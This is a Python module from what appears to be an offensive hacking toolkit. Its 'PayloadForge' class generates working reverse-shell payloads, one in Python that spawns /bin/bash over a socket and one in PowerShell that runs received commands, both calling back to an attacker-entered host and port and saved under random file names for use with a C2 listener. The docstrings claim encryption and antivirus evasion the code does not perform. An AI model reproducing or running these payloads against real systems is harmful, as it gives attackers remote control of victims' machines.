import os
import random
import string
from rich.console import Console
from core.ui import draw_header

console = Console()


class PayloadForge:
    def generate_random_name(self):
        return ''.join(random.choices(string.ascii_lowercase, k=8))

    def forge_python_revshell(self, lhost, lport):
        """Encrypted Python Reverse Shell Payload."""
        raw_code = f"""
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
        """.strip()
        return raw_code

    def forge_powershell_revshell(self, lhost, lport):
        """Base64 Encoded PowerShell Payload (Antivirus Evasion)."""
        cmd = f'$c = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sy = (char)27 + "[1;31m" + $sb + (char)27 + "[0m";$sendback = ([text.encoding]::ASCII).GetBytes($sy + "PS " + (pwd).Path + "> ");$s.Write($sendback,0,$sendback.Length);$s.Flush()}};$c.Close()'
        return cmd

    def run(self):
        draw_header("Payload Forge: msfvenom-Elite")
        lhost = console.input("[bold yellow]LHOST (Your IP): [/bold yellow]")
        lport = console.input(
            "[bold yellow]LPORT (Default 4444): [/bold yellow]") or "4444"

        console.print("\n[1] Linux (Python)  [2] Windows (PowerShell)")
        choice = console.input("\n[forge]> ")

        name = self.generate_random_name()
        if choice == "1":
            payload = self.forge_python_revshell(lhost, lport)
            fname = f"payloads/{name}.py"
        else:
            payload = self.forge_powershell_revshell(lhost, lport)
            fname = f"payloads/{name}.ps1"

        if not os.path.exists("payloads"):
            os.makedirs("payloads")
        with open(fname, "w") as f:
            f.write(payload)
        console.print(
            f"[bold green][+] Payload generated: {fname}[/bold green]")
        console.print(
            f"[dim]Note: Use GHOST-HUB C2 to listen on port {lport}[/dim]")


def generate_shell():
    forge = PayloadForge()
    forge.run()
